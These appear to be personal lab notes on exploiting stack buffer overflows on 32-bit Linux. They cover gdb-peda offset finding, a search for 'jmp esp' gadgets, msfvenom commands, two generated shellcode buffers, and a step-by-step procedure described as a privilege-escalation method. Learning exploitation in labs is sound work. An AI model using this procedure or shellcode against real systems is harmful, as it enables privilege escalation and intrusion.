buffer overflow- program that overloads the buffer member by 

heap-memory that can be allocated and deallocated

stack-continuous section of memory used for passing arguements

registers- storage elements

stack pointer(SP)- contains the address of next available address in the stack

base pointer(BP)-base of the stack

function- code that is seperate from the main program, used to replace code/modify

shellcode- code that is executed once an exploit is successfully used against a vulnerability


gdb ./func   #makes gdb easier to read and puts us in (gdb-peda$)
run
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa      #this is the string we put in to overflow the buffer


writemask.eu  -> buffer overflow pattern generator
run
enter the pattern they give you
take the 0x? value next to eip
put that value into writemask.eu and find the offset

python 2  #just type python for python 2

run <<< $(python buffover.py)   #takes output of buffover.py into the input of the script,don't use <<< if not looking for user input

(linops)
msfconsole
use payload/linux/x86/exec
show options
set CMD whoami
#generate -b "\x00\x20\0xa\x0d" -f python
generate -b "\x00" -f python     #-b means that you don't want that null byte in there(\x00)

buf =  b""
buf += b"\xd9\xc3\xbf\x5a\x01\x6e\x86\xd9\x74\x24\xf4\x5b"
buf += b"\x29\xc9\xb1\x0b\x31\x7b\x19\x83\xc3\x04\x03\x7b"
buf += b"\x15\xb8\xf4\x04\x8d\x64\x6e\x8a\xf7\xfc\xbd\x48"
buf += b"\x71\x1b\xd5\xa1\xf2\x8b\x26\xd6\xdb\x29\x4e\x48"
buf += b"\xad\x4e\xc2\x7c\xaa\x90\xe3\x7c\xc2\xf8\x8c\x1d"
buf += b"\x41\x91\x52\x89\xca\xe8\xb2\xf8\x6d"

(linops)
env - gdb func    #lets you see it raw because gdb-peta won't work
show env
unset env LINES
unset env COLUMNS
run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
info proc map
 0xf7de1000    #first address after heap on the start addr side   0xf7def000,0xf7ffe000
 0xffffe000    #last address after heap on the end addr side
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    #0xff= jump, 0xe4=esp

0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
0xf7f64aff
0xf7f64d6f
0x f7 f6 4f 97
0xf7f650cf
0xf7f65343
0xf7f65497
0xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
0xf7f6649b
0xf7f66533
0xf7f66633
0xf7f66b3b
0xf7f66b8b
0xf7f66cdb
0xf7f67033
0xf7f67203
0xf7f67293
0xf7f676db
0xf7f677a3
0xf7f67843
0xf7f67ecb
0xf7f67ee3
0xf7f67f9b
0xf7f68043
0xf7f683eb
0xf7f6863b

vim buffover.py
eip = "\x97\x4f\xf6\xf7"   # takes one of those addresses above and puts two characters going backwards
sudo ./func <<<$(python buffover.py)

if it doesn't work regenerate shellcode,use different eip

#### BUFFRER OVERFLOW PROCESS ####
0. identify buffer overflowable program
  a. can you get a "segmentation fault"
  b. open it up in peda. can you identify a buffer-overflowable function? (print, gets, puts, etc)
1. Run the program and observe how it works.
  a. does it take user input?
  b. can it be overflowed?
  
2. find your offset.
  a. wiremask.eu pattern generator
  b. use 4 "B"s in your EIP, do you have positive control
  
3. find your EIP
  a. gdb -env
  b. show env
  c. unset env ...
  d. run the program and overflow it
  e. info proc map
  f. grab after the heap before the stack
  g. find /b 0x..., 0x..., 0xff, 0xe4
  
4. Put EIP in REVERSE ENDIAN
  a. 0xf7f610ab should be \xab\x10\xf6\xf75. Generate shellcode
5.
  a. msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
  b. OR, use msfconsole6. Ensure print statement contains buff + eip + nop + shellcode7. 
6. Ensure print statement contains buff + eip + nop + shellcode
7. Run program outside of GDB with input of python script
  a. sudo ./func <<< $(python buffer.py)
~

(gdb-peta)
pdisass main
pdisass getuserinput
the red one is the one that is vulnerable to something

gdb on box means buffer overflow is method of privilege escalation and can only be used once you have access to the box.


buf =  b""
buf += b"\xbe\x54\x15\x0a\x83\xd9\xec\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x0b\x31\x75\x14\x03\x75\x14\x83\xed"
buf += b"\xfc\xb6\xe0\x60\x88\x6e\x92\x27\xe8\xe6\x89\xa4"
buf += b"\x7d\x11\xb9\x05\x0d\xb5\x3a\x32\xde\x27\x52\xac"
buf += b"\xa9\x44\xf6\xd8\xad\x8a\xf7\x18\xc5\xe2\x98\x79"
buf += b"\x44\x9b\x66\x2d\xc5\xd2\x86\x1c\x69"

0xf7def000
0xf7ffe000

0xf7df1b51
0xf7f6674b
0xf7f72753
0xf7f72c6b
0xf7f72df7
0xf7f7307b
0xf7f7322b
0xf7f73237
0xf7f732f7
0xf7f7365b
0xf7f73c5f
0xf7f73c67
0xf7f742c3
0xf7f743db
0xf7f744eb
0xf7f74643
0xf7f7471b
0xf7f747db
0xf7f74803
0xf7f748db
0xf7f74a7b
0xf7f74a9b
0xf7f74d83
0xf7f74ffb
0xf7f751cb
0xf7f7542b
0xf7f75443
0xf7f7572b
0xf7f7573b
0xf7f75d33
0xf7f75f53
0xf7f761ab
0xf7f76253
0xf7f768c3
0xf7f76abb

sudo ./inventory.exe <<<$(python /home/comrade/moreover.py)
